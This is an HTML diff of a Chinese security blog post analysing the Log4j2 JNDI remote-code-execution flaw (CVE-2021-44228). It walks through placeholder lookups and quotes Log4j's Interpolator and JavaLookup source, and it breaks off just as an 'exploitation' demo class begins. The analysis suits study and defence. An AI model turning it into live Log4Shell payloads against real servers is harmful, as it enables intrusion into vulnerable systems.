@@ -1,0 +1,1338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>log4j2分析 - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="log4j2分析" />
+<meta property="og:description" content="log4j2分析" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/log4j2/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-03T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-12-03T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="log4j2分析"/>
+<meta name="twitter:description" content="log4j2分析"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/log4j2/" /><link rel="prev" href="https://mi3aka.eu.org/fastjson/" /><link rel="next" href="https://mi3aka.eu.org/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "log4j2分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/log4j2\/"
+        },"genre": "posts","wordcount":  3523 ,
+        "url": "https:\/\/mi3aka.eu.org\/log4j2\/","datePublished": "2022-12-03T14:08:30+00:00","dateModified": "2022-12-03T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">log4j2分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author">
+                    <a href="/" title="Author" rel="author" class="author">Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-12-03">2022-12-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 3523 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#属性占位符">属性占位符</a></li>
+    <li><a href="#攻击利用">攻击利用</a></li>
+    <li><a href="#链条分析">链条分析</a>
+      <ul>
+        <li><a href="#日志记录">日志记录</a></li>
+        <li><a href="#字符串处理">字符串处理</a></li>
+        <li><a href="#lookup处理">lookup处理</a></li>
+      </ul>
+    </li>
+    <li><a href="#递归解析与混淆">递归解析与混淆</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><blockquote>
+<p>参考文章</p>
+</blockquote>
+<p><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="noopener noreffer ">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>
+<p><a href="https://paper.seebug.org/1789/" target="_blank" rel="noopener noreffer ">从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228 漏洞</a></p>
+<h2 id="属性占位符">属性占位符</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">log4j2demo</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">log4j2demo</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">a</span><span class="o">=</span><span class="s">&#34;${java:os}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png, https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png 1.5x, https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png"
+        title="https://img.mi3aka.eu.org/2023/02/34bc12aac56b0ede5da1fe458a3836e6.png" /></p>
+<p>log4j2中环境变量键值对被封装为了StrLookup对象,这些变量的值可以通过属性占位符来引用,格式为<code>${prefix:key}</code></p>
+<p>属性占位符在<code>lookup</code>下的<code>Interpolator</code>类进行处理</p>
+<p><code>strLookupMap</code>为<code>HashMap</code>类型,将<code>prefix</code>与对应的<code>Lookup</code>方法建立联系</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.Interpolator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="nf">Interpolator</span><span class="o">(</span><span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">properties</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">defaultLookup</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MapLookup</span><span class="o">(</span><span class="n">properties</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;()</span> <span class="o">:</span> <span class="n">properties</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// TODO: this ought to use the PluginManager
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;log4j&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Log4jLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;sys&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">SystemPropertiesLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;env&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">EnvironmentLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;main&#34;</span><span class="o">,</span> <span class="n">MainMapLookup</span><span class="o">.</span><span class="na">MAIN_SINGLETON</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;marker&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">MarkerLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;java&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">JavaLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;lower&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">LowerLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&#34;upper&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">UpperLookup</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// JNDI
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// [LOG4J2-703] We might be on Android
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">strLookupMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">LOOKUP_KEY_JNDI</span><span class="o">,</span> <span class="n">Loader</span><span class="o">.</span><span class="na">newCheckedInstanceOf</span><span class="o">(</span><span class="s">&#34;org.apache.logging.log4j.core.lookup.JndiLookup&#34;</span><span class="o">,</span> <span class="n">StrLookup</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="n">LinkageError</span> <span class="o">|</span> <span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">handleError</span><span class="o">(</span><span class="n">LOOKUP_KEY_JNDI</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>lookup</code>方法中根据<code>prefix</code>对<code>strLookupMap</code>进行查询,调用对应的<code>Lookup</code>方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png, https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png 1.5x, https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png"
+        title="https://img.mi3aka.eu.org/2023/02/b28f58024abdd30c3f953c3bf094364f.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.Interpolator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="n">String</span> <span class="n">var</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">var</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">prefixPos</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">PREFIX_SEPARATOR</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">prefixPos</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">prefix</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">prefixPos</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">US</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">StrLookup</span> <span class="n">lookup</span> <span class="o">=</span> <span class="n">strLookupMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">prefix</span><span class="o">);</span> <span class="c1">//获取的Lookup方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="k">instanceof</span> <span class="n">ConfigurationAware</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">((</span><span class="n">ConfigurationAware</span><span class="o">)</span> <span class="n">lookup</span><span class="o">).</span><span class="na">setConfiguration</span><span class="o">(</span><span class="n">configuration</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">value</span> <span class="o">=</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">:</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span> <span class="c1">//调用lookup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">defaultLookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">var</span><span class="o">)</span> <span class="o">:</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">var</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Demo中使用的是<code>${java:os}</code>,因此进入<code>JavaLookup</code>,根据<code>key</code>即<code>os</code>调用<code>getOperatingSystem</code>方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png, https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png 1.5x, https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png"
+        title="https://img.mi3aka.eu.org/2023/02/0c67975224bdcc31efd368d154796068.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.JavaLookup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">switch</span> <span class="o">(</span><span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;version&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s">&#34;Java version &#34;</span> <span class="o">+</span> <span class="n">getSystemProperty</span><span class="o">(</span><span class="s">&#34;java.version&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;runtime&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getRuntime</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;vm&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getVirtualMachine</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;os&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getOperatingSystem</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;hw&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getHardware</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="s">&#34;locale&#34;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">getLocale</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="攻击利用">攻击利用</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">log4j2rce</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
